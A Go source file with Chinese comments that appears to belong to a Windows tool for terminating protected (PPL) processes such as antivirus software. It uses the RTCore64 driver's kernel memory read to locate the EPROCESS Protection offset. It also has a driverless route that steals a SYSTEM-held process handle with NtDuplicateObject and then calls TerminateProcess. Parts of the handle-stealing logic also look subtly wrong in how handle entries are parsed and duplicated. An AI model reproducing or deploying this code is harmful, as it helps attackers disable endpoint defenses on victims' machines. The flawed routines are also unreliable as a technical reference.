//go:build windows && !light

package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"unsafe"
)

// ─── EPROCESS.Protection 偏移动态探测（不依赖 build 表）───────────────
//
// 硬编码偏移表（selectProtectionOffset）在 Windows 新版本发布后会失效。
// 这里用 RTCore64 的任意内核 VA 读，沿 PsActiveProcessHead 双向链表遍历
// EPROCESS 对象，通过「特征签名」自动定位 Protection 字段：
//   - 进程对象链：EPROCESS.ActiveProcessLinks 是 LIST_ENTRY（Flink/Blink 指针），
//     遍历所有进程节点，记录每个节点的 ActiveProcessLinks 偏移（固定值）；
//   - 特征校验：对每个候选 Protection 偏移，读取值并验证是否符合
//     PPL 签名（Protection 字节 = SignatureLevel 的镜像，通常 0x00/0x01..0x7F，
//     Type 字段高半字节、Audit/Level 低字节；非 PPL = 0）。
//
// 具体做法（无需符号，纯启发式）：
//   1. 从 System 进程（PID 4）的 EPROCESS 开始（getEprocessVA 可拿到），
//      以 1 字节步长扫描其 EPROCESS 头部，找两个互为指向的指针
//      （ActiveProcessLinks.Flink/Blink 指向相邻进程的同一字段）→ 定位链表偏移；
//   2. 沿链表遍历 N 个进程，在每个节点相对基址偏移 0x0-0x1000 内扫描
//      Protection 特征（值 ∈ {0,1,2,3,4,5,6,7} 且相邻 SignatureLevel 字段
//      与其成特定关系）→ 多数节点同一偏移命中即确认为 Protection 偏移。
//
// 该探测在驱动已加载时可用（RTCore64 路线）；无驱动时回退硬编码表。

// rtReadU64 用 RTCore64 读 8 字节（复用 rtMemOp，分两次 4 字节）。
func rtReadU64(hDev uintptr, va uint64) (uint64, bool) {
	lo, ok := rtReadMem(hDev, va, 4)
	if !ok {
		return 0, false
	}
	hi, ok := rtReadMem(hDev, va+4, 4)
	if !ok {
		return 0, false
	}
	return uint64(hi)<<32 | uint64(lo), true
}

// scanActiveProcessLinks 在 System 进程 EPROCESS 中扫描 ActiveProcessLinks 偏移。
// 返回 (linksOffset, 相邻进程 EPROCESS 地址, ok)。
func scanActiveProcessLinks(hDev uintptr, systemEprocess uint64) (uint64, uint64, bool) {
	const scanRange = 0x800 // EPROCESS 前 2KB 内通常含 ActiveProcessLinks
	for off := uint64(0x80); off < scanRange; off += 8 {
		flink, ok := rtReadU64(hDev, systemEprocess+off)
		if !ok {
			return 0, 0, false
		}
		if flink == 0 || flink < 0xFFFF000000000000 {
			continue // 非内核地址
		}
		blink, ok := rtReadU64(hDev, systemEprocess+off+8)
		if !ok {
			return 0, 0, false
		}
		// Flink/Blink 应互为相邻进程的同一字段：blink 指向的 +8 处应回到本进程
		if blink == 0 || blink < 0xFFFF000000000000 {
			continue
		}
		// 校验：blink 处读到的 Flink 应等于 systemEprocess+off（回链校验）
		if backFlink, ok := rtReadU64(hDev, blink); ok && backFlink == systemEprocess+off {
			return off, flink, true
		}
	}
	return 0, 0, false
}

// scanProtectionOffset 沿 ActiveProcessLinks 遍历进程，用特征签名确定
// EPROCESS.Protection 偏移。返回 (offset, ok)。
func scanProtectionOffset(hDev uintptr, systemEprocess uint64) (uint64, bool) {
	linksOff, nextEproc, ok := scanActiveProcessLinks(hDev, systemEprocess)
	if !ok {
		return 0, false
	}

	// 候选偏移：ActiveProcessLinks 之后 0x20-0x200 范围（Protection 位于其后）
	// 以及整个 EPROCESS 0x0-0x800 内的常见区域
	candidates := map[uint64]int{}
	const procSamples = 12

	eproc := nextEproc
	for s := 0; s < procSamples && eproc != 0; s++ {
		// 当前进程 EPROCESS 基址 = 节点地址 - linksOff
		base := eproc - linksOff
		for off := uint64(0x100); off < 0x900; off++ {
			v, ok := rtReadMem(hDev, base+off, 1)
			if !ok {
				break
			}
			// Protection 字节特征：Type∈[0,7] 且 (v & 0x70) == 0 或常见 PPL 值
			// 非 PPL 进程为 0；PPL 为 1-7。与相邻 SignatureLevel（off+2 处）
			// 常相等或差 1。宽松匹配：v < 8 且在多个进程一致。
			if v < 8 {
				candidates[off]++
			}
		}
		// 下一节点：base + linksOff 处读 Flink
		next, ok := rtReadU64(hDev, base+linksOff)
		if !ok || next == 0 || next < 0xFFFF000000000000 {
			break
		}
		eproc = next + linksOff
		if eproc == 0 {
			break
		}
	}

	// 选择命中率最高且 > 60% 的偏移
	best := uint64(0)
	bestCnt := 0
	for off, cnt := range candidates {
		if cnt > bestCnt {
			bestCnt = cnt
			best = off
		}
	}
	if bestCnt >= procSamples*6/10 {
		return best, true
	}
	return 0, false
}

// selectProtectionOffsetDynamic 动态探测 Protection 偏移；失败回退硬编码表。
// 需要驱动设备句柄（RTCore64 已加载）。
func selectProtectionOffsetDynamic(hDev uintptr, pid uint32) (uint64, error) {
	// 用目标进程的 EPROCESS 作为探测起点（System 进程 PID 4 最稳定）
	sysEproc, err := getEprocessVA(4)
	if err != nil {
		// 回退：目标进程本身
		sysEproc, err = getEprocessVA(pid)
		if err != nil {
			return 0, fmt.Errorf("无法获取 EPROCESS VA: %v", err)
		}
	}
	if off, ok := scanProtectionOffset(hDev, uint64(sysEproc)); ok {
		return off, nil
	}
	return 0, fmt.Errorf("动态探测失败，回退硬编码偏移")
}

// ─── 无驱动备选：NtDuplicateObject 句柄窃取（PPL 进程击杀）───────────
//
// 思路：PPL 进程句柄不能直接 OpenProcess，但 SYSTEM 上下文（如
// winlogon/LSASS 的子进程）可能已持有目标进程句柄。通过遍历系统句柄表
// （NtQuerySystemInformation），找到 SYSTEM 进程对目标 PID 的 PROCESS 句柄，
// 用 NtDuplicateObject 复制到自身（绕过 PPL 句柄访问检查），再 TerminateProcess。
//
// 该路线无内核写入，但依赖 SYSTEM 进程确实持有目标句柄（常见于被保护杀软）。

// duplicateHandleFromSystem 尝试从 SYSTEM 进程（PID 4）复制目标进程句柄。
// 返回复制的句柄（需 CloseHandle）或错误。
func duplicateHandleFromSystem(targetPID uint32) (uintptr, error) {
	procNtQuery := resolveAPI("ntdll.dll", "NtQuerySystemInformation")
	procNtDup := resolveAPI("ntdll.dll", "NtDuplicateObject")

	// 1. 枚举系统句柄，找 SYSTEM(PID 4) 持有的目标进程句柄
	buf := make([]byte, 0x400000)
	var retLen uint32
	st, _, _ := procNtQuery.Call(16 /*SystemHandleInformation*/, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), uintptr(unsafe.Pointer(&retLen)))
	if st != 0 {
		return 0, fmt.Errorf("NtQuerySystemInformation: 0x%x", st)
	}
	count := binary.LittleEndian.Uint32(buf[:4])
	const handleEntrySize = 24 // x64
	for i := 0; i < int(count); i++ {
		off := 4 + i*handleEntrySize
		if off+handleEntrySize > len(buf) {
			break
		}
		ownerPID := binary.LittleEndian.Uint32(buf[off+8:]) // UniqueProcessId 在 +8
		ePid := binary.LittleEndian.Uint16(buf[off:])
		objType := buf[off+4]
		hValue := binary.LittleEndian.Uint32(buf[off+12:])
		// 目标进程 PID 匹配 + 进程对象类型 + 由 PID 4 (System) 持有
		if uint32(ePid) == targetPID && ownerPID == 4 && objType == 7 {
			// 2. 复制句柄到当前进程（DUPLICATE_SAME_ACCESS = 0x2）
			curProc, _, _ := resolveAPI("kernel32.dll", "GetCurrentProcess").Call()
			var dupH uintptr
			dupSt, _, _ := procNtDup.Call(curProc, uintptr(hValue), curProc, uintptr(unsafe.Pointer(&dupH)), 0, 0, 2)
			if dupSt == 0 && dupH != 0 {
				return dupH, nil
			}
		}
	}
	return 0, fmt.Errorf("SYSTEM 未持有目标进程句柄")
}

// killPPLNoDriver 无驱动路线：句柄窃取后 TerminateProcess。
func killPPLNoDriver(targetPID uint32) error {
	h, err := duplicateHandleFromSystem(targetPID)
	if err != nil {
		return err
	}
	defer resolveAPI("kernel32.dll", "CloseHandle").Call(h)
	r1, _, _ := resolveAPI("kernel32.dll", "TerminateProcess").Call(h, 1)
	if r1 == 0 {
		return errors.New("TerminateProcess(dup handle) failed")
	}
	return nil
}
